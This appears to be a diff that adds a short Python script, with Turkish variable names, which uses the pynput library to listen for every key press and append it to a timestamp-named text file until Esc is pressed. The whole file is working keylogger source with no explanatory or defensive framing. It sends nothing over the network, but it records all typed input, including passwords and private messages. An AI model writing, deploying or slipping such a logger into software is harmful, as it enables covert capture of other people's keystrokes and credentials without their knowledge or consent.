@@ -1,0 +1,28 @@
+import os
+import time
+from pynput.keyboard import Key, Controller, Listener
+import math
+
+d_isim = str(math.ceil(time.time()))+".txt"
+
+def basildi(harf):
+
+
+    if  harf == Key.esc :
+        return  False
+
+    elif harf == Key.enter :
+        with open(d_isim, "a+", encoding="utf-8") as defter:
+            defter.write("\n")
+    elif harf == Key.space :
+        print("bosluk yapildi")
+        with open(d_isim, "a+", encoding="utf-8") as defter:
+            defter.write(" ")
+
+    else :
+        with open(d_isim, "a+" , encoding="utf-8") as defter:
+            soz = str(harf).replace("'", "")
+            defter.write(soz)
+
+with Listener (on_press=basildi) as dinle :
+    dinle.join()
